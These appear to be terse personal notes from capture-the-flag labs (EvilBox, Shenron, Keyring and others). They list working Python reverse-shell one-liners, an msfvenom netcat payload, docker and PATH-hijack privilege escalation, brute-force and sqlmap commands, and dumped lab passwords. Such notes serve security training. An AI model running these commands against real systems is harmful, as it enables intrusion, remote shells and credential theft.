<h1> Machines Notes </h1>
# EvilBox
FFUF: fuzzing for url parameter
ssh2john: to encrypt rsa key so that we can find password with john
ssh using rsa key
encrypting password to md5


# PWNED
sudo -u selena /home/messenger.sh
ssh -i id_rsa ariana@192.168.1.78
docker run -v /:/mnt --rm -it privesc chroot /mnt sh

# PYLINGTON
1. .CC is a source code file of c++

# SHENRON 
1. wpscan --url http://shenron --usernames admin --passwords /usr/share/wordlists/rockyou.txt
2. echo /bin/bash > netstat
3. export PATH=/tmp/:$PATH
4. shenron@shenron:/tmp$ chmod +x netstat
5. shenron@shenron:~$ ./network

# BLUEMOON

1. docker run -v /:/mnt --rm -it alpine chroot /mnt sh




# DC:7
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R

Change ip 
sudo apt install metasploit-framework

# Beelzebub
47009.c exploit local privilege escalation
valac page
echo "bleezebub" | md5sum


# WEB:7
-> sqlmap -u url --forms --dbs --current-db
-> sqlmap -u http://192.168.1.146/enter_network/ --forms  -D machine --tables --level=1 --risk=3 --random-agent

# THM ContainMe-V4
-> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Keyring

-> ffuf -u http://192.168.0.115/history.php?FUZZ=flash -w /usr/share/wordlists/dirb/big.txt -b "PHPSESSID=rj7m62mbp4imcmpt596ghuh0os" -fs 0

PHPSESSID: aga6cj3gm29ojcn6sdjl37375d

<=======================================================>
$servername = "localhost";
	$username = "root";
	$password = "sqluserrootpassw0r4";
	$database = "users";

<==========================================================>
+--------+--------------------------+
| name   | password                          |
+--------+--------------------------+
| admin  | myadmin#p4szw0r4d       |
| flash     | 1234                                  |
| john      | Sup3r$S3cr3t$PasSW0RD    |
| mayank | mayank                             |
| web       | 1234                                 |
+--------+--------------------------+

-> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.110",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'




